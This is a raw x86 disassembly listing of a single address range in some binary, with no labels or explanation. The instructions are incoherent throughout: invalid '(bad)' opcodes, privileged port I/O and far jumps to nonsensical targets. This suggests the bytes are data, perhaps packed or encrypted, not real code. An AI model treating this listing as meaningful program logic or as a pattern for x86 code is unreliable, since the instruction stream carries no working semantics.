  4196da:	sbb    ch,ah
  4196dc:	mov    ds:0xa43b5887,eax
  4196e1:	mov    al,0x3d
  4196e3:	push   es
  4196e4:	hlt    
  4196e5:	enter  0xe219,0xa5
  4196e9:	inc    eax
  4196ea:	loope  0x419735
  4196ec:	or     ecx,eax
  4196ee:	jae    0x4196f3
  4196f0:	add    dl,BYTE PTR [ecx+0x13120451]
  4196f6:	sub    DWORD PTR [ebp+0x35],ecx
  4196f9:	sub    ch,bl
  4196fb:	gs and eax,0x2278d096
  419701:	lods   eax,DWORD PTR ds:[esi]
  419702:	test   eax,0xd09c00ea
  419707:	sbb    cl,BYTE PTR [esi]
  419709:	jmp    0x7dad0f3
  41970e:	dec    ebp
  41970f:	rcr    BYTE PTR [eax+edx*2-0x19],0x60
  419714:	cmc    
  419715:	push   cs
  419716:	jbe    0x41969d
  419718:	mov    bh,0x93
  41971a:	mov    dl,0x45
  41971c:	mov    ds:0xe0b63a02,al
  419721:	push   edx
  419722:	out    0xe8,al
  419724:	mov    DWORD PTR [eax],esi
  419726:	sbb    ebx,DWORD PTR [eax+eiz*2]
  419729:	outs   dx,DWORD PTR ds:[esi]
  41972a:	in     eax,0x5e
  41972c:	jp     0x419727
  41972e:	push   es
  41972f:	dec    ecx
  419730:	rol    ah,1
  419732:	mov    ds:0xccbbccd9,eax
  419737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419738:	sub    ecx,esp
  41973a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41973b:	retf   
  41973c:	in     al,dx
  41973d:	mov    ch,BYTE PTR [edi+0x67]
  419740:	sub    bl,BYTE PTR [edx+eiz*8-0x2376858e]
  419747:	jne    0x41971a
  419749:	retf   0xf0e0
  41974c:	sbb    BYTE PTR [edi+0x45],bl
  41974f:	retf   
  419750:	sbb    BYTE PTR [ebx-0x1f],ah
  419753:	xor    al,0x63
  419755:	rol    DWORD PTR [esi*1-0x7706b8e7],0x89
  41975d:	xor    BYTE PTR [ecx+ebp*2-0x20],ah
  419761:	clc    
  419762:	retf   0x8f7c
  419765:	out    0xf4,al
  419767:	sbb    BYTE PTR [edx],ah
  419769:	sahf   
  41976a:	(bad)  
  41976b:	lds    edx,FWORD PTR [esi]
  41976d:	xchg   ebx,eax
  41976e:	mov    eax,ds:0x16ef33e7
  419773:	es stos DWORD PTR es:[edi],eax
  419775:	xor    BYTE PTR [bx+si],cl
  419778:	xchg   ecx,eax
  419779:	scas   al,BYTE PTR es:[edi]
  41977a:	arpl   WORD PTR [esp+ebx*1],sp
  41977d:	jmp    0x678ace5b
  419782:	adc    BYTE PTR [edx+ebx*2],bh
  419785:	add    eax,0x88c87178
  41978a:	or     BYTE PTR [ecx+edx*2],dl
  41978d:	js     0x4197ab
  41978f:	popf   
  419790:	sbb    al,0xfe
  419792:	in     eax,dx
  419793:	aaa    
  419794:	pop    ebx
  419795:	push   esp
  419796:	es stos BYTE PTR es:[edi],al
  419798:	dec    esp
  419799:	in     eax,dx
  41979a:	sbb    al,0xc7
  41979c:	add    DWORD PTR [ebp+0x4f39c5a1],ebx
  4197a2:	adc    ch,BYTE PTR [eax+0x56]
  4197a5:	das    
  4197a6:	lods   eax,DWORD PTR ds:[esi]
  4197a7:	mov    bl,0x6b
  4197a9:	sub    al,0x65
  4197ab:	not    DWORD PTR [esi+ecx*8+0x30]
  4197af:	ja     0x419825
  4197b1:	jnp    0x4197dc
  4197b3:	(bad)  
  4197b4:	fnstenv [esi]
  4197b6:	retf   
  4197b7:	pop    es
  4197b8:	dec    BYTE PTR ds:0x998cb5b3
  4197be:	mov    DWORD PTR [ecx],ecx
  4197c0:	xchg   esi,eax
  4197c1:	cs jnp 0x419760
  4197c4:	push   ebx
  4197c5:	add    al,0x95
  4197c7:	mov    dl,ah
  4197c9:	dec    edx
  4197ca:	icebp  
  4197cb:	ret    0x42e8
  4197ce:	pop    esi
  4197cf:	or     eax,DWORD PTR [edx]
  4197d1:	fcmovnu st,st(6)
  4197d3:	sub    BYTE PTR [edx],0xc9
  4197d6:	sar    DWORD PTR [eax],0xd4
  4197d9:	sub    BYTE PTR [ebx+0x7edca431],ah
  4197df:	sub    BYTE PTR [ebp+0x2c],ah
  4197e2:	push   0x3b7c6772
  4197e7:	mov    eax,ds:0x3672408e
  4197ec:	aad    0x79
  4197ee:	xchg   bl,dl
  4197f0:	iret   
  4197f1:	jae    0x41986b
  4197f3:	jbe    0x419804
  4197f5:	pop    ss
  4197f6:	cs sub edx,esi
  4197f9:	mov    ah,0x24
  4197fb:	and    al,0xa3
  4197fd:	inc    ebx
  4197fe:	xchg   edi,eax
  4197ff:	cmp    BYTE PTR [eax],dl
  419801:	pop    ds
  419802:	pusha  
  419803:	dec    edi
  419804:	gs paddusw mm6,mm1
  419808:	inc    edi
  419809:	mov    BYTE PTR [esi-0x62],dh
  41980c:	push   0xffbd3e2e
  419811:	mov    ds:0x3bd2274b,eax
  419816:	neg    BYTE PTR ds:0xef571e0c
  41981c:	jae    0x419814
  41981e:	test   ebx,ecx
  419820:	inc    ebx
  419821:	sti    
  419822:	test   eax,0x77fa76bb
  419827:	mov    dh,BYTE PTR [edi]
  419829:	lock jge 0x419833
  41982c:	sub    BYTE PTR [ebx+0x6f],0x6f
  419830:	inc    edx
  419831:	outs   dx,BYTE PTR ds:[esi]
  419832:	retf   0x7dd
  419835:	cmp    BYTE PTR [esi+0x1c],bh
  419838:	xor    eax,0x389c8d3d
  41983d:	aad    0x31
  41983f:	dec    ebx
  419840:	pop    ebp
  419841:	pop    ds
  419842:	outs   dx,DWORD PTR ds:[esi]
  419843:	in     al,0xfd
  419845:	fcmovbe st,st(3)
  419847:	dec    edi
  419848:	outs   dx,BYTE PTR ds:[esi]
  419849:	cld    
  41984a:	(bad)  
  41984c:	inc    esi
  41984d:	out    dx,eax
  41984e:	aaa    
  41984f:	push   edi
  419850:	push   ss
  419851:	pop    ebx
  419852:	aas    
  419853:	test   al,0x9a
  419855:	cmp    eax,0xcfaeff35
  41985a:	and    ecx,ebp
  41985c:	add    ah,BYTE PTR gs:[ebp-0x4f]
  419860:	cmp    ah,BYTE PTR [edi]
  419862:	imul   DWORD PTR [ecx]
  419864:	sub    DWORD PTR [edi+ecx*2-0x5cddfcda],0xffffffd0
  41986c:	xchg   ecx,eax
  41986d:	inc    edx
  41986e:	mov    al,0x38
  419870:	gs push eax
  419872:	scas   al,BYTE PTR es:[edi]
  419873:	mov    al,BYTE PTR [ebp+eax*1-0x4af7af6b]
  41987a:	mov    eax,ds:0xb1130b11
  41987f:	inc    ecx
  419880:	sub    DWORD PTR [eax],esi
  419882:	dec    edx
  419883:	dec    eax
  419884:	mov    ah,0x42
  419886:	imul   edx,eax,0xffffffde
  419889:	loopne 0x41989b
  41988b:	fiadd  DWORD PTR [ebp-0x3f]
  41988e:	shl    BYTE PTR [ebp+0x0],1
  419891:	push   esp
  419892:	test   eax,0x177ab870
  419897:	inc    edi
  419898:	sbb    bl,BYTE PTR [edi]
  41989a:	sub    al,BYTE PTR [edi-0x413fb785]
  4198a0:	call   0x4e34eef3
  4198a5:	(bad)  
  4198a6:	cld    
  4198a7:	sub    al,0x5b
  4198a9:	ds in  eax,0x3
  4198ac:	cmc    
  4198ad:	not    DWORD PTR [eax]
  4198af:	xchg   DWORD PTR [ebx+0x58],edi
  4198b2:	int    0x52
  4198b4:	outs   dx,BYTE PTR ds:[esi]
  4198b5:	stos   DWORD PTR es:[edi],eax
  4198b6:	mov    esi,0x99664e97
  4198bb:	xor    BYTE PTR [ebx],dh
  4198bd:	cmp    BYTE PTR [edx],al
  4198bf:	(bad)  
  4198c0:	ror    BYTE PTR [ebx],cl
  4198c2:	in     al,dx
  4198c3:	test   al,0xec
  4198c5:	mov    ds:0x1e9c2a6e,al
  4198ca:	sbb    al,0x63
  4198cc:	nop
  4198cd:	scas   eax,DWORD PTR es:[edi]
  4198ce:	adc    BYTE PTR [ebx-0x21ebbf78],ch
  4198d4:	pop    edx
  4198d5:	xchg   esi,eax
  4198d6:	mov    dl,0xe
  4198d8:	imul   ebp,DWORD PTR [esi-0x38],0xffffffb8
  4198dc:	sahf   
  4198dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198de:	push   ds
  4198df:	int3   
  4198e0:	adc    BYTE PTR [ebx-0x30f5e9cf],bl
  4198e6:	test   dl,dl
  4198e8:	cld    
  4198e9:	xchg   ebx,ecx
  4198eb:	xchg   esi,eax
  4198ec:	or     ebp,ebx
  4198ee:	sub    ebx,esp
  4198f0:	mov    bl,0x75
  4198f2:	sbb    al,0xd0
  4198f4:	fucomip st,st(4)
  4198f6:	repz sar DWORD PTR [ebx+0x17547652],1
  4198fd:	cwde   
  4198fe:	push   cs
  4198ff:	jmp    0x215:0x2841ba44
  419906:	adc    eax,0xac8d44a1
  41990b:	mov    esi,0x854c9d1a
  419910:	push   ss
  419911:	add    DWORD PTR [ebp-0x5a1f35d0],esp
  419917:	pushf  
  419918:	pop    ss
  419919:	fmul   st,st(3)
  41991b:	test   BYTE PTR [edi],ch
  41991d:	pop    ebp
  41991e:	sbb    BYTE PTR [edx+0x7a],dh
  419921:	imul   eax,eax,0x3229deec
  419927:	out    dx,eax
  419928:	jmp    0xfaa863c
  41992d:	and    DWORD PTR [esi],ecx
  41992f:	xor    eax,0x932eb59d
  419934:	ja     0x419972
  419936:	inc    edx
  419937:	ds rep ins DWORD PTR es:[edi],dx
  41993a:	out    0xa6,al
  41993c:	mov    dh,0x78
  41993e:	iret   
  41993f:	sahf   
  419940:	cmp    ah,bl
  419942:	sti    
  419943:	into   
  419944:	xchg   edx,eax
  419945:	push   0xcc7b5485
  41994a:	dec    esi
  41994b:	gs hlt 
  41994d:	pop    edx
  41994e:	xor    DWORD PTR [ecx-0x2f],edi
  419951:	and    al,0x88
  419953:	inc    ebx
  419954:	jb     0x419941
  419956:	xchg   ecx,eax
  419957:	xchg   edx,eax
  419958:	jl     0x419912
  41995a:	push   es
  41995b:	or     BYTE PTR [esi-0x3fa35f2f],dh
  419961:	retf   0x136f
  419964:	mov    BYTE PTR [esi],bl
  419966:	jo     0x4198f6
  419968:	int    0x6e
  41996a:	lahf   
  41996b:	ret    
  41996c:	out    dx,eax
  41996d:	sbb    dh,BYTE PTR [edx+0x4543de33]
  419973:	push   edi
  419974:	cdq    
  419975:	push   eax
  419976:	mov    bl,0x68
  419978:	popf   
  419979:	shl    DWORD PTR [esi+0x2d],cl
  41997c:	cli    
  41997d:	outs   dx,BYTE PTR ds:[esi]
  41997e:	popf   
  41997f:	jbe    0x419964
  419981:	imul   ebx,DWORD PTR [esi],0xe5c937d8
  419987:	push   ebp
  419988:	int    0xa0
  41998a:	adc    esi,DWORD PTR [edx]
  41998c:	dec    DWORD PTR [ebx+edx*4+0x4e]
  419990:	jge    0x419923
  419992:	int    0x78
  419994:	test   DWORD PTR [ebx+0x1ba21feb],edi
  41999a:	aas    
  41999b:	retf   
  41999c:	hlt    
  41999d:	mov    ebp,0xf5ad92df
  4199a2:	retf   0xd3a1
  4199a5:	pop    edi
  4199a6:	test   eax,0xec632dfe
  4199ab:	dec    edx
  4199ac:	arpl   WORD PTR [edi+ebx*8],bp
  4199af:	cld    
  4199b0:	fdiv   st,st(3)
  4199b2:	sub    bh,ch
  4199b4:	fucomi st,st(7)
  4199b6:	fldenv [ecx-0x21]
  4199b9:	or     DWORD PTR [ecx+eiz*8],eax
  4199bc:	neg    DWORD PTR ds:0x8c06fe00
  4199c2:	push   DWORD PTR [ebp-0x408b5049]
  4199c8:	lods   al,BYTE PTR ds:[esi]
  4199c9:	loope  0x419a3a
  4199cb:	and    ebp,DWORD PTR [edi]
  4199cd:	mov    ah,0x96
  4199cf:	adc    DWORD PTR [ebx-0x56],0xffffff95
  4199d3:	je     0x4199d0
  4199d5:	mov    dh,0xfe
  4199d7:	int3   
  4199d8:	adc    ebp,DWORD PTR [ebx-0x41]
  4199db:	fsubp  st(7),st
  4199dd:	in     eax,0xff
  4199df:	js     0x419a4c
  4199e1:	mov    ebp,0xbe31477d
  4199e6:	enter  0xc1f2,0xdf
  4199ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199eb:	(bad)  
  4199ec:	jo     0x419972
  4199ee:	add    ebx,0x33614f68
  4199f4:	cmp    al,bl
  4199f6:	sub    eax,0x6a129f0a
  4199fb:	(bad)
  4199ff:	push   es
  419a00:	ins    DWORD PTR es:[edi],dx
  419a01:	adc    al,0x5e
  419a03:	jns    0x4199e7
  419a05:	shl    BYTE PTR [edx],0x16
  419a08:	jp     0x419a1c
  419a0a:	and    ecx,DWORD PTR [edi+eax*2+0x12535501]
  419a11:	bound  esp,QWORD PTR [ecx+0x6cdb91a]
  419a17:	add    al,0x83
  419a19:	pop    eax
  419a1a:	test   DWORD PTR ds:0x1c39eb4d,ebx
  419a20:	out    dx,al
  419a21:	loope  0x419a00
  419a23:	mov    ch,0x7b
  419a25:	mov    eax,0x5201f1a7
  419a2a:	fnclex 
  419a2c:	fadd   st,st(6)
  419a2e:	sub    DWORD PTR [esi],ebp
  419a30:	pop    esp
  419a31:	sbb    al,0x63
  419a33:	jns    0x419aa2
  419a35:	call   0xa61c:0xd0826a68
  419a3c:	sbb    DWORD PTR [esi-0x48],edx
  419a3f:	xor    ecx,DWORD PTR [edx-0x4e08f168]
  419a45:	mov    ah,0x56
  419a47:	lock lahf 
  419a49:	into   
  419a4a:	jl     0x4199e0
  419a4c:	dec    esp
  419a4d:	mov    esi,0x9fb26cc1
  419a52:	mov    esi,DWORD PTR [esi-0x7b]
  419a55:	call   0x7ac6:0x1c9fd8ce
  419a5c:	iret   
  419a5d:	push   edx
  419a5e:	(bad)  
  419a5f:	sbb    al,0x81
  419a61:	outs   dx,DWORD PTR ds:[esi]
  419a62:	jecxz  0x419a81
  419a64:	add    al,0x18
  419a66:	jmp    0x9642:0xc52a114a
  419a6d:	mov    bl,0x50
  419a6f:	hlt    
  419a70:	cdq    
  419a71:	xor    al,0x75
  419a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a74:	cmp    DWORD PTR [ecx],0xfffffff0
  419a77:	mov    al,0x90
  419a79:	inc    esi
  419a7a:	in     al,dx
  419a7b:	or     BYTE PTR [ebp+0x41d93bdf],al
  419a81:	aaa    
  419a82:	arpl   WORD PTR [edx],bp
  419a84:	mov    ch,0xb8
  419a86:	add    al,0x80
  419a88:	lods   eax,DWORD PTR ds:[esi]
  419a89:	ds out dx,eax
  419a8b:	fild   DWORD PTR ds:0x1dd84991
  419a91:	int    0x52
  419a93:	xor    esp,DWORD PTR [ebx+0x68]
  419a96:	mov    DWORD PTR [edx+0x46],ecx
  419a99:	jle    0x419a5f
  419a9b:	aam    0x97
  419a9d:	stc    
  419a9e:	jp     0x419ae1
  419aa0:	sub    ecx,DWORD PTR ds:0x9caa51e2
  419aa6:	push   ds
  419aa7:	sahf   
  419aa8:	pop    ecx
  419aa9:	lds    esi,FWORD PTR [ebx-0x55]
  419aac:	mov    gs,WORD PTR [edi]
  419aae:	popf   
  419aaf:	jmp    0x419aa4
  419ab1:	lock test eax,0x425a9536
  419ab7:	jne    0x419a65
  419ab9:	inc    edx
  419aba:	ja     0x419aa4
  419abc:	dec    edx
  419abd:	bound  edi,QWORD PTR [edi+0x74]
  419ac0:	adc    eax,0x6f68a312
  419ac5:	je     0x419b2f
  419ac7:	sub    eax,0xe175a3ed
  419acc:	adc    ch,ch
  419ace:	dec    esi
  419acf:	sbb    BYTE PTR [edi+0x18669c7e],0xb1
  419ad6:	aaa    
  419ad7:	fadd   st(7),st
  419ad9:	dec    esp
  419ada:	mov    eax,0x33eba193
  419adf:	jg     0x419a9a
  419ae1:	dec    esi
  419ae2:	xchg   ecx,eax
  419ae3:	(bad)  
  419ae4:	popa   
  419ae5:	stos   BYTE PTR es:[edi],al
  419ae6:	adc    esi,edx
  419ae8:	mov    ?,WORD PTR [edx]
  419aea:	or     BYTE PTR [edi+0x57],al
  419aed:	repz and eax,0xb84642e9
  419af3:	loopne 0x419afa
  419af5:	(bad)  
  419af6:	mov    al,ds:0x9ad42103
  419afb:	test   dl,0x80
  419afe:	adc    ecx,edi
  419b00:	(bad)  
  419b01:	ins    BYTE PTR es:[edi],dx
  419b02:	xor    eax,0xb6541957
  419b07:	test   al,0x9a
  419b09:	or     BYTE PTR [ecx],0x35
  419b0c:	xchg   ecx,edx
  419b0e:	pop    ebp
  419b0f:	bound  ebx,QWORD PTR [ecx+0x1cb110c6]
  419b15:	sahf   
  419b16:	loopne 0x419ac6
  419b18:	leave  
  419b19:	or     DWORD PTR [edx+eiz*2+0x56],eax
  419b1d:	push   esi
  419b1e:	or     eax,0x58a717dd
  419b23:	jge    0x419b0f
  419b25:	jbe    0x419b15
  419b27:	mov    edx,0x58a4fa0f
  419b2c:	fbld   TBYTE PTR [edx-0x39]
  419b2f:	adc    DWORD PTR [ebx+0xc],0x2f33f36b
  419b36:	(bad)  
  419b37:	aad    0x6d
  419b39:	femms  
  419b3b:	jp     0x419b4f
  419b3d:	in     eax,dx
  419b3e:	mov    esi,0x3ff272ab
  419b43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b44:	sub    edi,ebp
  419b46:	mov    edi,0xdbcf67b3
  419b4b:	push   ds
  419b4c:	add    al,0xbe
  419b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b4f:	add    BYTE PTR [eax-0x31300ce3],dh
  419b55:	into   
  419b56:	retf   0xc0df
  419b59:	cli    
  419b5a:	fisttp WORD PTR [eax-0x6a14414]
  419b60:	scas   eax,DWORD PTR es:[edi]
  419b61:	test   BYTE PTR [esi],al
  419b63:	mov    DWORD PTR [ecx+0x55],0x6b731d41
  419b6a:	loope  0x419bd6
  419b6c:	dec    edi
  419b6d:	daa    
  419b6e:	das    
  419b6f:	mov    esp,0x74bfed98
  419b74:	mov    edx,0x9fb750fd
  419b79:	dec    DWORD PTR [edi+ebp*4-0x2d]
  419b7d:	push   0xffffffa6
  419b7f:	cmc    
  419b80:	add    eax,0x1fdf796
  419b85:	mov    ch,0xba
  419b87:	xbegin 0x7933bc0f
  419b8d:	push   ebp
  419b8e:	shr    BYTE PTR ds:0xc5e4da,1
  419b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b95:	sbb    al,0x3a
  419b97:	aam    0xd4
  419b99:	and    ecx,DWORD PTR [ebp+0x18]
  419b9c:	cmp    BYTE PTR [edi+esi*8-0x76ee21bc],dl
  419ba3:	adc    BYTE PTR ds:0x62187a86,al
  419ba9:	xchg   esp,eax
  419baa:	mov    edx,0x22d543f2
  419baf:	les    eax,FWORD PTR [ecx-0x43f9afde]
  419bb5:	inc    esi
  419bb6:	cmp    al,0x1c
  419bb8:	mov    gs,esi
  419bba:	in     al,0xbe
  419bbc:	retf   0x600f
  419bbf:	popf   
  419bc0:	gs popa 
  419bc2:	mov    eax,0xcf6bc3c0
  419bc7:	mov    al,0x71
  419bc9:	(bad)  
  419bca:	push   ds
  419bcb:	dec    esi
  419bcc:	lods   eax,DWORD PTR ds:[esi]
  419bcd:	(bad)  
  419bce:	cmp    al,0xad
  419bd0:	hlt    
  419bd1:	outs   dx,BYTE PTR ds:[esi]
  419bd2:	cs sti 
  419bd4:	std    
  419bd5:	in     al,dx
  419bd6:	lods   al,BYTE PTR ds:[esi]
  419bd7:	pop    edi
  419bd8:	loop   0x419bb3
  419bda:	cmc    
  419bdb:	arpl   WORD PTR [edx+edx*8],cx
  419bde:	push   cs
  419bdf:	xchg   ebp,eax
  419be0:	xchg   BYTE PTR fs:[ebp-0x62000cbe],dh
  419be7:	cli    
  419be8:	xor    BYTE PTR [eax-0x3a2216a8],ah
  419bee:	dec    edx
  419bef:	call   0xfb96:0x6ef96a72
  419bf6:	push   ebp
  419bf7:	and    BYTE PTR ss:[edi],0x68
  419bfb:	call   0x4283e029
  419c00:	mov    ebx,0x12a02389
  419c05:	add    al,0x4c
  419c07:	inc    ebp
  419c08:	or     eax,0x510fd6f6
  419c0d:	packuswb mm6,QWORD PTR [eax+0x68]
  419c11:	call   0x943e:0xf1dd9c66
  419c18:	sar    DWORD PTR [ebx+ebp*2-0x2b],cl
  419c1c:	repz int3 
  419c1e:	call   0xbb93:0x1d5d9e5
  419c25:	(bad)  
  419c26:	sub    DWORD PTR [ecx+ebx*8-0x38],esi
  419c2a:	shr    DWORD PTR [ebx-0x9],cl
  419c2d:	pop    eax
  419c2e:	call   0x521d8a6e
  419c33:	and    ebp,esi
  419c35:	jge    0x419c61
  419c37:	xchg   edx,eax
  419c38:	jecxz  0x419c2b
  419c3a:	sbb    BYTE PTR ds:0xd4532794,dl
  419c40:	test   al,0x8
  419c42:	dec    eax
  419c43:	inc    esi
  419c44:	mov    bl,BYTE PTR [eax+0x66]
  419c47:	push   es
  419c48:	into   
  419c49:	mov    bh,0xe1
  419c4b:	(bad)  
  419c4c:	into   
  419c4d:	je     0x419c47
  419c4f:	ret    
  419c50:	out    0x5a,eax
  419c52:	int3   
  419c53:	mov    bh,0xb
  419c55:	jmp    0x638d:0x76a63513
  419c5c:	sbb    eax,0x3d1cb664
  419c61:	push   esp
  419c62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c63:	cmc    
  419c64:	cmp    al,0xb1
  419c66:	adc    DWORD PTR [edx],ebx
  419c68:	xchg   ebx,eax
  419c69:	or     eax,0x4455136a
  419c6e:	sbb    DWORD PTR [esi+0x2fd642d6],esi
  419c74:	ffree  st(6)
  419c76:	mov    al,0x67
  419c78:	enter  0x22d5,0x6b
  419c7c:	ret    
  419c7d:	jne    0x419c95
  419c7f:	into   
  419c80:	out    dx,eax
  419c81:	loop   0x419c55
  419c83:	mov    esi,DWORD PTR [ebx]
  419c85:	add    al,0x51
  419c87:	inc    edx
  419c88:	push   esp
  419c89:	sbb    DWORD PTR [ecx+0x0],edi
  419c8c:	enter  0x14a8,0x60
  419c90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c91:	cld    
  419c92:	enter  0x1968,0xa2
  419c96:	shr    DWORD PTR [ebp+0x4a03f28c],1
  419c9c:	test   al,0x24
  419c9e:	xchg   dl,bh
  419ca0:	pop    eax
  419ca1:	xchg   ebp,eax
  419ca2:	mov    ah,0x93
  419ca4:	xor    edi,DWORD PTR [edi+0x22]
  419ca7:	in     al,0xd8
  419ca9:	adc    edx,DWORD PTR [ecx]
  419cab:	out    0xc3,eax
  419cad:	push   cs
  419cae:	jae    0x419ceb
  419cb0:	cmp    al,0x53
  419cb2:	data16 das 
  419cb4:	xor    esp,ecx
  419cb6:	sbb    al,0x5b
  419cb8:	lds    ebx,FWORD PTR [edx]
  419cba:	pop    edx
  419cbb:	dec    ebp
  419cbc:	push   edx
  419cbd:	imul   ebx,DWORD PTR [eax],0xffffff8a
  419cc0:	out    0x39,al
  419cc2:	jbe    0x419c52
  419cc4:	dec    edi
  419cc5:	jae    0x419ca8
  419cc7:	lds    esi,FWORD PTR [edx+0x68]
  419cca:	jmp    0x6981:0xff784f6a
  419cd1:	sub    al,0x7d
  419cd3:	jb     0x419c90
  419cd5:	jge    0x419d1f
  419cd7:	ficom  WORD PTR [eax+0x200000]
  419cdd:	dec    ecx
  419cde:	inc    esp
  419cdf:	inc    ecx
  419ce0:	push   esp
  419ce1:	(bad)  
  419ce4:	es xchg ebp,eax
  419ce6:	cmp    ebx,DWORD PTR [esi+0x7e3fccad]
  419cec:	loopne 0x419d31
  419cee:	dec    ebx
  419cef:	out    0x6,eax
  419cf1:	mov    bh,0x1d
  419cf3:	fidivr DWORD PTR [edi]
  419cf5:	idiv   al
  419cf7:	lahf   
  419cf8:	push   cs
  419cf9:	pop    esp
  419cfa:	out    dx,eax
  419cfb:	cdq    
  419cfc:	cmp    eax,0xdefbec3b
  419d01:	(bad)  
  419d02:	and    al,dh
  419d04:	cmp    eax,0x957e052f
  419d09:	xor    edi,esp
  419d0b:	outs   dx,BYTE PTR ds:[esi]
  419d0c:	je     0x419d0d
  419d0e:	scas   eax,DWORD PTR es:[edi]
  419d0f:	ins    DWORD PTR es:[edi],dx
  419d10:	cmp    ecx,DWORD PTR [edx]
  419d12:	mov    dl,0x36
  419d14:	aas    
  419d15:	outs   dx,DWORD PTR ds:[esi]
  419d16:	jp     0x419d11
  419d18:	push   esp
  419d19:	mov    ah,0x5c
  419d1b:	je     0x419caf
  419d1d:	ror    DWORD PTR [edi-0x4b],cl
  419d20:	ds pop eax
  419d22:	or     al,0xf3
  419d24:	pop    edi
  419d25:	jmp    0x419ccc
  419d27:	lds    eax,FWORD PTR [ebx+0x418b4e83]
  419d2d:	mov    ah,0xcc
  419d2f:	lds    edi,FWORD PTR [ebp-0x1]
  419d32:	xchg   BYTE PTR [edx-0x54],bh
  419d35:	mov    BYTE PTR [edx+0x30],ah
  419d38:	fisub  DWORD PTR [ebx-0x2882fad6]
  419d3e:	addr16 call 0x310c4997
  419d44:	push   esi
  419d45:	test   al,0x4
  419d47:	add    DWORD PTR [ecx-0x494e5a6c],edx
  419d4d:	mov    al,0xd8
  419d4f:	pop    esp
  419d50:	adc    ebp,DWORD PTR [eax+0x61]
  419d53:	sub    al,0x89
  419d55:	mov    DWORD PTR [eax+eax*4+0x73],edx
  419d59:	add    eax,0xd09c9565
  419d5e:	mov    BYTE PTR [edx-0x56],ah
  419d61:	sub    ah,BYTE PTR [eax-0x18]
  419d64:	pusha  
  419d65:	mov    edx,0xf2b873a8
  419d6a:	adc    esi,edx
  419d6c:	push   es
  419d6d:	addr16 js 0x419de6
  419d70:	jmp    0x419d7e
  419d72:	jmp    0x419d1f
  419d74:	jnp    0x419d9e
  419d76:	into   
  419d77:	in     al,dx
  419d78:	bound  esi,QWORD PTR [ebx-0xe]
  419d7b:	inc    edi
  419d7c:	add    BYTE PTR [ebp+0x6ee6420b],cl
  419d82:	lahf   
  419d83:	in     ax,0xec
  419d86:	and    al,BYTE PTR [ecx-0x2c]
  419d89:	and    DWORD PTR [ebx+0x4d],esi
  419d8c:	pushf  
  419d8d:	push   edx
  419d8e:	mov    WORD PTR [edi-0x6a],ss
  419d91:	test   al,0xaa
  419d93:	mov    WORD PTR [ebp+0x1cf63efe],es
  419d99:	pushf  
  419d9a:	mov    ds:0x45e2eadd,eax
  419d9f:	xor    DWORD PTR [edi+0x6c],0x70207ab5
  419da6:	repz sbb BYTE PTR [bx-0x13],dh
  419dab:	fsub   QWORD PTR [esi+esi*1-0x38]
  419daf:	xor    BYTE PTR [esp+eax*2-0x78],bl
  419db3:	test   eax,0xadec5dea
  419db8:	sbb    eax,0x683b5621
  419dbd:	adc    eax,0x4437327d
  419dc2:	mov    esi,esp
  419dc4:	rol    DWORD PTR [ebp-0x131701f7],1
  419dca:	nop
  419dcb:	dec    edx
  419dcc:	xor    eax,DWORD PTR [edx]
  419dce:	scas   eax,DWORD PTR es:[edi]
  419dcf:	cdq    
  419dd0:	sahf   
  419dd1:	imul   edx,edx,0x2a
  419dd4:	cmp    al,0x35
  419dd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dd7:	sbb    dh,dh
  419dd9:	sti    
  419dda:	ins    BYTE PTR es:[edi],dx
  419ddb:	sub    al,0xb4
  419ddd:	js     0x419dcf
  419ddf:	nop
  419de0:	jo     0x419e59
  419de2:	mov    bl,0xcb
  419de4:	dec    esp
  419de5:	cmp    BYTE PTR [eax-0x2ce73957],ah
  419deb:	rcl    DWORD PTR [edi-0x32],cl
  419dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419def:	repz xchg esp,eax
  419df1:	push   ebp
  419df2:	sbb    DWORD PTR [esi],0x5df38e3c
  419df8:	iret   
  419df9:	and    edx,DWORD PTR [edi-0x5d8341ad]
  419dff:	mov    ecx,?
  419e01:	daa    
  419e02:	addr16 sbb ah,al
  419e05:	retf   
  419e06:	xchg   BYTE PTR [eax-0x776a2f22],ah
  419e0c:	in     al,dx
  419e0d:	sbb    eax,0xabd6547e
  419e12:	inc    esi
  419e13:	jg     0x419da6
  419e15:	push   esi
  419e16:	inc    esp
  419e17:	pop    edx
  419e18:	mov    al,0x85
  419e1a:	arpl   WORD PTR gs:[ecx-0x75],sp
  419e1e:	lods   al,BYTE PTR ds:[esi]
  419e1f:	fild   DWORD PTR [ebx]
  419e21:	retf   0x85b9
  419e24:	loop   0x419e63
  419e26:	sub    cl,BYTE PTR [eax+ebx*4+0x788939dc]
  419e2d:	and    DWORD PTR ds:0x105bb2da,ebx
  419e33:	aaa    
  419e34:	jmp    0x4f6e:0xf751815
  419e3b:	cvtpi2ps xmm0,QWORD PTR [edi+0xa]
  419e3f:	loop   0x419e9e
  419e41:	pop    ecx
  419e42:	ss sub al,0x40
  419e45:	sub    eax,0x73c8e5d2
  419e4a:	out    0x59,eax
  419e4c:	mov    ebx,0xd3bf49b4
  419e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e52:	xor    DWORD PTR [ebx+0x593f4bf1],ebx
  419e58:	arpl   si,cx
  419e5a:	(bad)  
  419e5b:	icebp  
  419e5c:	stc    
  419e5d:	pop    ss
  419e5e:	pop    edx
  419e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e60:	mov    ch,0xc7
  419e62:	jmp    0xae2e698e
  419e67:	in     al,dx
  419e68:	es lock pop ebp
  419e6b:	cmp    ah,BYTE PTR [edi-0x22]
  419e6e:	retf   
  419e6f:	ret    
  419e70:	pop    edi
  419e71:	mov    ecx,es
  419e73:	sub    ch,dh
  419e75:	cld    
  419e76:	leave  
  419e77:	fnstcw WORD PTR [bx]
  419e7a:	shl    DWORD PTR [eax],cl
